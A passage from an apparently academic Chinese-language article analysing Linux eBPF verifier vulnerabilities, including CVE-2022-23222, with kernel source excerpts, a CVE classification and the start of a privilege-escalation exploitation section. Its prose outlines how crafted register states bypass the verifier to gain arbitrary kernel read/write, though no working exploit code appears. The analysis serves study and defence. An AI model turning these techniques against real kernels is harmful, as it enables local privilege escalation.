<a href="#__codelineno-10-25" id="__codelineno-10-25" name="__codelineno-10-25"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_min_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">max_t</span><span class="p">(</span><span class="n">u32</span><span class="p">,</span><span class="w"> </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_min_value</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">var32_off</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
<a href="#__codelineno-10-26" id="__codelineno-10-26" name="__codelineno-10-26"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_max_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">min</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">u32_max_value</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="p">)(</span><span class="n">var32_off</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">var32_off</span><span class="p">.</span><span class="n">mask</span><span class="p">));</span>
<a href="#__codelineno-10-27" id="__codelineno-10-27" name="__codelineno-10-27"></a><span class="p">}</span>
</code></pre></div>
<p>比如我们可以构造<span><span class="heti-spacing"> </span>r2</span>，其<span class="heti-skip"><span class="heti-spacing"> </span>mask<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0xffffffff_00000000</span>、<span>value<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0x1</span>，即只有低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位确定为<span><span class="heti-spacing"> </span>1</span>，再构造<span class="heti-skip"><span class="heti-spacing"> </span>r3<span class="heti-spacing"> </span></span>完全确定为<span><span class="heti-spacing"> </span>0x1_00000002</span>。接下来我们对<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>r3<span class="heti-spacing"> </span></span>进行<span><span class="heti-spacing"> </span>AND</span>，会有以下几个步骤：</p>
<ul>
<li><code>tnum_and</code> 函数会更新<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>的寄存器状态，其<span class="heti-skip"><span class="heti-spacing"> </span>mask<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0x1_00000000</span>，<span>value<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0</span>，即只有第<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位不确定，其他都为<span><span class="heti-spacing"> </span>0</span></li>
<li><code>scalar32_min_max_and</code> 函数会直接返回，因为<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>r3<span class="heti-spacing"> </span></span>的低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位都完全确定</li>
<li><code>scalar_min_max_and</code> 函数不会调用到 <code>__mark_reg_known</code>，因为<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位值并不完全确定</li>
<li><code>__update_reg32_bounds</code> 函数会更新<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位范围<ul>
<li>因为<span><span class="heti-spacing"> </span>var_off32.value = 0 &lt; s32_min_value = 1</span>，所以<span class="heti-skip"><span class="heti-spacing"> </span>s32_min_value<span class="heti-spacing"> </span></span>不变</li>
<li>因为<span><span class="heti-spacing"> </span>var_off32.value = 0 &lt; s32_max_value = 1</span>，所以<span class="heti-skip"><span class="heti-spacing"> </span>s32_max_value<span class="heti-spacing"> </span></span>变为<span><span class="heti-spacing"> </span>0</span></li>
<li><span>u32_min_value<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>u32_max_value<span class="heti-spacing"> </span></span>同理</li>
</ul>
</li>
</ul>
<p>这样下来的结果就是<span class="heti-skip"><span class="heti-spacing"> </span>r2<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位范围都变为了最大为<span class="heti-skip"><span class="heti-spacing"> </span>0<span class="heti-spacing"> </span></span>最小为<span><span class="heti-spacing"> </span>1</span>，会出现检查错误。同样利用即可绕过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的检查实现任意地址读写。解决方式也是为 <code>scalar32_min_max_and</code> 函数在<span class="heti-skip"><span class="heti-spacing"> </span>src<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>dst<span class="heti-spacing"> </span></span>都确定的情况下添加 <code>__mark_reg32_known</code> 函数的调用设置边界即可。</p>
<h3 id="cve-2022-23222">CVE-2022-23222<a class="headerlink" href="#cve-2022-23222" title="Permanent link">¶</a></h3>
<p>这个漏洞由<span class="heti-skip"><span class="heti-spacing"> </span>tr3e<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>2022<span class="heti-spacing"> </span></span>年<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>月发现并上报，这个漏洞和前三个漏洞略有不同，但也是在<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>程序中出现了遗漏的检查导致的。</p>
<p><span>Verifier<span class="heti-spacing"> </span></span>在检查使用指针的指令时会对指令是否有效进行检查。比如在调用 <code>bpf_map_lookup_elem()</code> 函数后，如果不判断结果是否为<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>则无法使用这个结果，因为<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>验证这可能是个<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>指针，如果使用了的话会拒绝加载。关于指针是否有效，<span>verifier<span class="heti-spacing"> </span></span>通过 <code>enum bpf_reg_type</code> 来记录寄存器中值的类型，这部分代码如下：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="k">enum</span><span class="w"> </span><span class="n">bpf_reg_type</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="w">    </span><span class="n">NOT_INIT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">         </span><span class="cm">/* nothing was written into register */</span>
<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="w">    </span><span class="n">SCALAR_VALUE</span><span class="p">,</span><span class="w">         </span><span class="cm">/* reg doesn't contain a valid pointer */</span>
<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="w">    </span><span class="n">PTR_TO_CTX</span><span class="p">,</span><span class="w">           </span><span class="cm">/* reg points to bpf_context */</span>
<a href="#__codelineno-11-5" id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="w">    </span><span class="n">CONST_PTR_TO_MAP</span><span class="p">,</span><span class="w">     </span><span class="cm">/* reg points to struct bpf_map */</span>
<a href="#__codelineno-11-6" id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="w">    </span><span class="n">PTR_TO_MAP_VALUE</span><span class="p">,</span><span class="w">     </span><span class="cm">/* reg points to map element value */</span>
<a href="#__codelineno-11-7" id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="w">    </span><span class="n">PTR_TO_MAP_VALUE_OR_NULL</span><span class="p">,</span><span class="w">  </span><span class="cm">/* points to map elem value or NULL */</span>
<a href="#__codelineno-11-8" id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="w">    </span><span class="n">PTR_TO_SOCKET</span><span class="p">,</span><span class="w">        </span><span class="cm">/* reg points to struct bpf_sock */</span>
<a href="#__codelineno-11-9" id="__codelineno-11-9" name="__codelineno-11-9"></a><span class="w">    </span><span class="n">PTR_TO_SOCKET_OR_NULL</span><span class="p">,</span><span class="w">      </span><span class="cm">/* reg points to struct bpf_sock or NULL */</span>
<a href="#__codelineno-11-10" id="__codelineno-11-10" name="__codelineno-11-10"></a><span class="w">    </span><span class="n">PTR_TO_SOCK_COMMON</span><span class="p">,</span><span class="w">   </span><span class="cm">/* reg points to sock_common */</span>
<a href="#__codelineno-11-11" id="__codelineno-11-11" name="__codelineno-11-11"></a><span class="w">    </span><span class="n">PTR_TO_SOCK_COMMON_OR_NULL</span><span class="p">,</span><span class="w"> </span><span class="cm">/* reg points to sock_common or NULL */</span>
<a href="#__codelineno-11-12" id="__codelineno-11-12" name="__codelineno-11-12"></a><span class="w">    </span><span class="n">PTR_TO_TCP_SOCK</span><span class="p">,</span><span class="w">      </span><span class="cm">/* reg points to struct tcp_sock */</span>
<a href="#__codelineno-11-13" id="__codelineno-11-13" name="__codelineno-11-13"></a><span class="w">    </span><span class="n">PTR_TO_TCP_SOCK_OR_NULL</span><span class="p">,</span><span class="w">    </span><span class="cm">/* reg points to struct tcp_sock or NULL */</span>
<a href="#__codelineno-11-14" id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="w">    </span><span class="n">PTR_TO_MEM</span><span class="p">,</span><span class="w">           </span><span class="cm">/* reg points to valid memory region */</span>
<a href="#__codelineno-11-15" id="__codelineno-11-15" name="__codelineno-11-15"></a><span class="w">    </span><span class="n">PTR_TO_MEM_OR_NULL</span><span class="p">,</span><span class="w">   </span><span class="cm">/* reg points to valid memory region or NULL */</span>
<a href="#__codelineno-11-16" id="__codelineno-11-16" name="__codelineno-11-16"></a><span class="w">    </span><span class="n">PTR_TO_RDONLY_BUF</span><span class="p">,</span><span class="w">    </span><span class="cm">/* reg points to a readonly buffer */</span>
<a href="#__codelineno-11-17" id="__codelineno-11-17" name="__codelineno-11-17"></a><span class="w">    </span><span class="n">PTR_TO_RDONLY_BUF_OR_NULL</span><span class="p">,</span><span class="w">  </span><span class="cm">/* reg points to a readonly buffer or NULL */</span>
<a href="#__codelineno-11-18" id="__codelineno-11-18" name="__codelineno-11-18"></a><span class="w">    </span><span class="n">PTR_TO_RDWR_BUF</span><span class="p">,</span><span class="w">      </span><span class="cm">/* reg points to a read/write buffer */</span>
<a href="#__codelineno-11-19" id="__codelineno-11-19" name="__codelineno-11-19"></a><span class="w">    </span><span class="n">PTR_TO_RDWR_BUF_OR_NULL</span><span class="p">,</span><span class="w">    </span><span class="cm">/* reg points to a read/write buffer or NULL */</span>
<a href="#__codelineno-11-20" id="__codelineno-11-20" name="__codelineno-11-20"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-11-21" id="__codelineno-11-21" name="__codelineno-11-21"></a><span class="p">};</span>
</code></pre></div>
<p>可以发现对于指针类型，会存在一些以 <code>_OR_NULL</code> 结尾的类型，表示这个指针的值未知，可能为<span><span class="heti-spacing"> </span>NULL</span>。然后<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>就会限制这些 <code>_OR_NULL</code> 类型的指针的使用，其可以进行的操作非常有限。只有在与<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>进行不等的比较后才可以去掉 <code>_OR_NULL</code>，这样<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>才能确定这个指针不为<span><span class="heti-spacing"> </span>NULL</span>。</p>
<p>前三个漏洞中的更新是针对标量（不带指针）的<span class="heti-skip"><span class="heti-spacing"> </span>ALU<span class="heti-spacing"> </span></span>运算检测，函数为 <code>adjust_scalar_min_max_vals()</code>，而本漏洞中存在问题的函数是针对指针类型的<span class="heti-skip"><span class="heti-spacing"> </span>ALU<span class="heti-spacing"> </span></span>运算检查 <code>adjust_ptr_min_max_vals()</code>。为了禁止对于可能为<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>的指针进行操作，在该函数的开头进行了检查：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">adjust_ptr_min_max_vals</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_verifier_env</span><span class="w"> </span><span class="o">*</span><span class="n">env</span><span class="p">,</span>
<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="w">                   </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="o">*</span><span class="n">insn</span><span class="p">,</span>
<a href="#__codelineno-12-3" id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="w">                   </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">ptr_reg</span><span class="p">,</span>
<a href="#__codelineno-12-4" id="__codelineno-12-4" name="__codelineno-12-4"></a><span class="w">                   </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">off_reg</span><span class="p">)</span>
<a href="#__codelineno-12-5" id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="p">{</span>
<a href="#__codelineno-12-6" id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="p">...</span>
<a href="#__codelineno-12-7" id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ptr_reg</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-12-8" id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_MAP_VALUE_OR_NULL</span><span class="p">:</span>
<a href="#__codelineno-12-9" id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="w">        </span><span class="n">verbose</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="w"> </span><span class="s">"R%d pointer arithmetic on %s prohibited, null-check it first</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
<a href="#__codelineno-12-10" id="__codelineno-12-10" name="__codelineno-12-10"></a><span class="w">            </span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="n">reg_type_str</span><span class="p">[</span><span class="n">ptr_reg</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">]);</span>
<a href="#__codelineno-12-11" id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EACCES</span><span class="p">;</span>
<a href="#__codelineno-12-12" id="__codelineno-12-12" name="__codelineno-12-12"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">CONST_PTR_TO_MAP</span><span class="p">:</span>
<a href="#__codelineno-12-13" id="__codelineno-12-13" name="__codelineno-12-13"></a><span class="w">        </span><span class="cm">/* smin_val represents the known value */</span>
<a href="#__codelineno-12-14" id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">known</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">smin_val</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">opcode</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">BPF_ADD</span><span class="p">)</span>
<a href="#__codelineno-12-15" id="__codelineno-12-15" name="__codelineno-12-15"></a><span class="w">            </span><span class="k">break</span><span class="p">;</span>
<a href="#__codelineno-12-16" id="__codelineno-12-16" name="__codelineno-12-16"></a><span class="w">        </span><span class="n">fallthrough</span><span class="p">;</span>
<a href="#__codelineno-12-17" id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_PACKET_END</span><span class="p">:</span>
<a href="#__codelineno-12-18" id="__codelineno-12-18" name="__codelineno-12-18"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_SOCKET</span><span class="p">:</span>
<a href="#__codelineno-12-19" id="__codelineno-12-19" name="__codelineno-12-19"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_SOCKET_OR_NULL</span><span class="p">:</span>
<a href="#__codelineno-12-20" id="__codelineno-12-20" name="__codelineno-12-20"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_SOCK_COMMON</span><span class="p">:</span>
<a href="#__codelineno-12-21" id="__codelineno-12-21" name="__codelineno-12-21"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_SOCK_COMMON_OR_NULL</span><span class="p">:</span>
<a href="#__codelineno-12-22" id="__codelineno-12-22" name="__codelineno-12-22"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_TCP_SOCK</span><span class="p">:</span>
<a href="#__codelineno-12-23" id="__codelineno-12-23" name="__codelineno-12-23"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_TCP_SOCK_OR_NULL</span><span class="p">:</span>
<a href="#__codelineno-12-24" id="__codelineno-12-24" name="__codelineno-12-24"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">PTR_TO_XDP_SOCK</span><span class="p">:</span>
<a href="#__codelineno-12-25" id="__codelineno-12-25" name="__codelineno-12-25"></a><span class="w">        </span><span class="n">verbose</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="w"> </span><span class="s">"R%d pointer arithmetic on %s prohibited</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
<a href="#__codelineno-12-26" id="__codelineno-12-26" name="__codelineno-12-26"></a><span class="w">            </span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="n">reg_type_str</span><span class="p">[</span><span class="n">ptr_reg</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">]);</span>
<a href="#__codelineno-12-27" id="__codelineno-12-27" name="__codelineno-12-27"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EACCES</span><span class="p">;</span>
<a href="#__codelineno-12-28" id="__codelineno-12-28" name="__codelineno-12-28"></a><span class="w">    </span><span class="k">default</span><span class="o">:</span>
<a href="#__codelineno-12-29" id="__codelineno-12-29" name="__codelineno-12-29"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
<a href="#__codelineno-12-30" id="__codelineno-12-30" name="__codelineno-12-30"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-12-31" id="__codelineno-12-31" name="__codelineno-12-31"></a><span class="p">...</span>
<a href="#__codelineno-12-32" id="__codelineno-12-32" name="__codelineno-12-32"></a><span class="p">}</span>
</code></pre></div>
<p>可见如果是一些 <code>_OR_NULL</code> 的指针，则会直接返回错误导致加载失败。但问题在于这个<span class="heti-skip"><span class="heti-spacing"> </span>switch<span class="heti-spacing"> </span></span>并没有对所有 <code>bpf_reg_type</code> 进行检查，比如 <code>PTR_TO_MEM_OR_NULL</code> <code>PTR_TO_RDONLY_BUF_OR_NULL</code> <code>PTR_TO_RDWR_BUF_OR_NULL</code> 等类型就并没有被检查，这样就会导致这些指针可以被用于运算，从而绕过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的检查。</p>
<p>接下来利用这个漏洞，我们通过调用 <code>BPF_FUNC_ring_reserve</code> 函数来得到一个 <code>PTR_TO_MEM_OR_NULL</code> 类型的指针，通过传入参数<span class="heti-skip"><span class="heti-spacing"> </span>0xfff...fff<span class="heti-spacing"> </span></span>我们可以得到<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>值的结果，假设为<span><span class="heti-spacing"> </span>r0</span>。接下来我们将<span class="heti-skip"><span class="heti-spacing"> </span>r0<span class="heti-spacing"> </span></span>复制到<span><span class="heti-spacing"> </span>r1</span>，再对<span class="heti-skip"><span class="heti-spacing"> </span>r1<span class="heti-spacing"> </span></span>加<span><span class="heti-spacing"> </span>1</span>，然后再对<span class="heti-skip"><span class="heti-spacing"> </span>r0<span class="heti-spacing"> </span></span>进行<span class="heti-skip"><span class="heti-spacing"> </span>NULL<span class="heti-spacing"> </span></span>检查，接下来<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>就会认为<span class="heti-skip"><span class="heti-spacing"> </span>r0<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>r1<span class="heti-spacing"> </span></span>都是<span class="heti-skip"><span class="heti-spacing"> </span>0<span class="heti-spacing"> </span></span>值。然后我们就可以像前三个漏洞一样对<span class="heti-skip"><span class="heti-spacing"> </span>r1<span class="heti-spacing"> </span></span>乘以任意值来实现任意地址读写，从而实现提权。</p>
<h3 id="ebpf_7"><span>eBPF<span class="heti-spacing"> </span></span>安全漏洞总结<a class="headerlink" href="#ebpf_7" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p><span>eBPF<span class="heti-spacing"> </span></span>作为一个强大的内核态执行引擎，其安全性至关重要。通过<span><span class="heti-spacing"> </span>verifier</span>、<span>JIT<span class="heti-spacing"> </span></span>编译器、内存访问限制等多种手段，<span>eBPF<span class="heti-spacing"> </span></span>保证了其安全性。但是在实际使用中，由于其复杂性和功能性，不可避免的会出现一些漏洞。这些漏洞大多是由于<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>在检查时遗漏了一些情况，导致了一些不符合规范的程序被加载。这些漏洞的利用方式也大多是通过构造一些特殊的指令序列来绕过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的检查，从而实现提权。</p>
<p>根据前面对于四个漏洞的分析，再加上在<span class="heti-skip"><span class="heti-spacing"> </span>NVD<span class="heti-spacing"> </span></span>上搜索查阅了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>相关会造成内核提权的严重漏洞（CVE-2021-3600、CVE-2021-3489、CVE-2021-4204、CVE-2021-31440、CVE-2021-34866、CVE-2023-39191、CVE-2022-0500<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，我们可以发现<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>相关漏洞经常出现于：</p>
<ul>
<li><span>Verifier<span class="heti-spacing"> </span></span>对于<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>指令集中<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位操作指令不能正确跟踪寄存器低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位值边界信息<ul>
<li>CVE-2020-8835、CVE-2020-27194、CVE-2021-3600、CVE-2021-31440</li>
</ul>
</li>
<li><span>Verifier<span class="heti-spacing"> </span></span>缺乏对于指针类型操作的检验，或变量类型混淆<ul>
<li>CVE-2022-23222、CVE-2023-39191、CVE-2021-34866</li>
</ul>
</li>
<li><span>eBPF helper<span class="heti-spacing"> </span></span>函数缺乏检测，导致通过参数越界读写<ul>
<li>CVE-2021-3489、CVE-2021-4204</li>
</ul>
</li>
<li><span>eBPF<span class="heti-spacing"> </span></span>程序不受限制的加载方式<ul>
<li>CVE-2022-0500（通过<span class="heti-skip"><span class="heti-spacing"> </span>BTF<span class="heti-spacing"> </span></span>加载导致的越界访问）</li>
</ul>
</li>
</ul>
<p><span>Mohamed<span class="heti-spacing"> </span></span>等人的研究 <em>Understanding the Security of Linux eBPF Subsystem</em> 中也统计了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>漏洞所有<span class="heti-skip"><span class="heti-spacing"> </span>CVE<span class="heti-spacing"> </span></span>出现的位置，结果如下：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img4.png"><img src="/assets/images/sec/syssec/project/img4.png" style="margin: 0 auto;" width="50%"/></a>
</div>
<p>可见将近一半的漏洞出现于<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>上，特别是对于<span class="heti-skip"><span class="heti-spacing"> </span>ALU<span class="heti-spacing"> </span></span>指令的检测上，其次是<span class="heti-skip"><span class="heti-spacing"> </span>helper<span class="heti-spacing"> </span></span>函数，接下来才是<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>相关<span class="heti-skip"><span class="heti-spacing"> </span>core<span class="heti-spacing"> </span></span>代码。这也说明了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的漏洞主要还是出现在<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>上，所以为了提高<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的安全性，我们可以增加对于<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>helper<span class="heti-spacing"> </span></span>函数的审计与<span class="heti-skip"><span class="heti-spacing"> </span>fuzz<span class="heti-spacing"> </span></span>测试，关注检验过程中的寄存器值边界问题，并关注指针类型的操作，并且在后续<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的扩展中也注意这些经常发生的问题，以免对于内核安全造成巨大影响。</p>
<h2 id="ebpf_8"><span>eBPF<span class="heti-spacing"> </span></span>漏洞提权利用分析<a class="headerlink" href="#ebpf_8" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<p>接下来我们基于<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>的漏洞来进一步分析，仅通过绕过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的寄存器值边界检查，该如何进行进一步的利用，实现地址泄漏、任意地址读写、内核提权等结果。</p>
<h3 id="_1">地址泄漏原理<a class="headerlink" href="#_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p>当使用 <code>bpf_create_map</code> 创建数组类型的<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>的时候，实际会调用内核中的 <code>map_create</code> 函数来创建如下的一个 <code>bpf_array</code> 结构体：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_array</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="n">map</span><span class="p">;</span>
<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="n">elem_size</span><span class="p">;</span>
<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="n">index_mask</span><span class="p">;</span>
<a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_array_aux</span><span class="w"> </span><span class="o">*</span><span class="n">aux</span><span class="p">;</span>
<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">value</span><span class="p">[];</span>
<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="w">        </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptrs</span><span class="p">[];</span>
<a href="#__codelineno-13-9" id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="w">        </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">pptrs</span><span class="p">[];</span>
<a href="#__codelineno-13-10" id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="w">    </span><span class="p">};</span>
<a href="#__codelineno-13-11" id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="p">}</span>
</code></pre></div>
<p>我们实际可控的，也就是实际读写访问的内存是最后的<span class="heti-skip"><span class="heti-spacing"> </span>union<span class="heti-spacing"> </span></span>也就是一个变长的<span class="heti-skip"><span class="heti-spacing"> </span>value<span class="heti-spacing"> </span></span>数组，正常情况下<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>会检查对这些的访存地址，只有落在<span class="heti-skip"><span class="heti-spacing"> </span>value<span class="heti-spacing"> </span></span>内的部分才能访存，否则会不通过验证、加载错误。</p>
